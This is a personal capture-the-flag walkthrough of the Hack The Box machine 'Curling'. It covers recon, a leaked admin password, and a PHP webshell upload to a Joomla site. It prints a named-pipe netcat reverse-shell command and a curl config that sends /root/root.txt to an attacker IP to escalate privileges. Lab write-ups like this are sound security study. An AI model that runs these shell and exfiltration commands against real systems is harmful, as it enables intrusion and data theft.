# Curling Box:
## Nmap scan:
```js
sudo nmap -sS 10.10.10.150                                     

Starting Nmap 7.40 ( https://nmap.org ) at 2018-11-14 22:44 AEDT
Nmap scan report for 10.10.10.150
Host is up (0.37s latency).                                                                                     
Not shown: 998 closed ports                                                                                     
PORT   STATE SERVICE                                                                                            
22/tcp open  ssh                                                                                                
80/tcp open  http                                                                                               
Nmap done: 1 IP address (1 host up) scanned in 146.83 seconds
```

## Secret.txt:
* Examining the HTML contents, we see a reference to secret.txt.
* Contains a base64 encoded string that is the password of the user: Floris
* Decodes to Curling2018!

## Administrator panel:
* Using dirsearch.py, we find that there is an admin panel for this website.
* Using U:Floris and P:Curling2018!, we can log in and install some modules.
* Install a file upload module. Modules can be found on the Joobla website.

## Attack:
* In the file upload module, disable all the security mechanisms.
* Upload a php webshell
* We have a password backup file but not sure what to do with it.
* Cant get the reverse shell to work however we can connect to the machine.

## Reverse shell (Not root):
* Managed to get a reverse shell via a named pipe.
* I set up my kali machine to be a listening server:
```js
  nc -lvnp 1234
```
* From the webshell, I executed:
```js
  rm /tmp/f
  mkfifo /tmp/f
  cat /tmp/f | /bin/sh -i 2>&1 | nc [server ip] [server port] > /tmp/f
```
* To get a proper shell that can handle signals and stuff:
```js
  python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Getting user.txt:
* Under /home/floris, there is a hexdump file called password_backup.
* The first few bytes indicates that this file is a bzip compressed archive.
* **bzip2 decompression:**
```js
  xxd -r password_backup > password_backup.bin
  bzip2 -d password_backup.bin // replaces the .bin file
```
* The extracted file is gzip compressed data. Decompressing:
```js
  gunzip < password_backip.out > pw 
```
* The extracted file "pw" is a tar archive so:
```js
  tar -xvf pw
```
* Finally a password.txt file appears which is the password for the account "floris". We can go ahead and ssh in using the user floris.

* Changed password to: passflag5

## Prvilege escalation:
* There is a folder in floris's home directory called "admin-area".
* Basically there is an unknown script that writes to both input and report every minute. See curl.png for more details.
* The script executes:
```js
 curl -K input -o report 
```
* The script above is running as **root**.
* The configuration file input is writeable.
* Change it so that it **uploads /root/root.txt**
* The configuration file should look like:
```js
  url="http://10.10.14.8" // ATTACKER IP
  -F "text=@/root/root.txt"
```
* Once the script executes curl with the configuration above, the contents of root.txt will be sent to the attacker's server on port 80 (http).
* Don't forget to setup a netcat server on the attacking machine on port 80.

## What I learned:
* To see all processes running on the system:
```js
  ps -ef 
```
* Command injection is sneaky and fun.
